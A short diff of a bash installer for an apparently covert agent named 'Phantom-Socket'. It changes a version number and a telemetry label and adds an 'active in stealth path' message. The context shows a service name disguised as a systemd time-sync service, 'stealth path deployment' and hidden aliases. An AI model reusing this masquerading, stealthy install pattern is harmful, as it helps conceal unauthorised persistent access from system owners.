@@ -1,5 +1,5 @@
 #!/bin/bash
-# Phantom-Socket V17.0 - Supreme Standardization Installer
+# Phantom-Socket V1.0 - Supreme Standardization Installer
 # Developed for Oyen-Sec/soket Infrastructure.
 # Features: Stealth path deployment, symbolic aliases, and detailed telemetry.
 
@@ -8,7 +8,7 @@ set -euo pipefail
 # ============================================================================
 # Configuration
 # ============================================================================
-readonly VERSION="17.0.0"
+readonly VERSION="1.0.0"
 readonly AGENT_NAME="phantom-client-prod"
 readonly SERVICE_NAME="dbus-org.freedesktop.timesync1"
 
@@ -101,7 +101,8 @@ install_and_alias() {
         echo "[*] Created user-level alias: $HOME/.local/bin/gs-oyen-s"
     fi
     
-    send_telemetry "INSTALL" "${target_binary}"
+    send_telemetry "INSTALL_SUCCESS" "${target_binary}"
+    echo "[+] Installation V1.0 Complete. Agent is now active in stealth path."
 }
 
 # ============================================================================
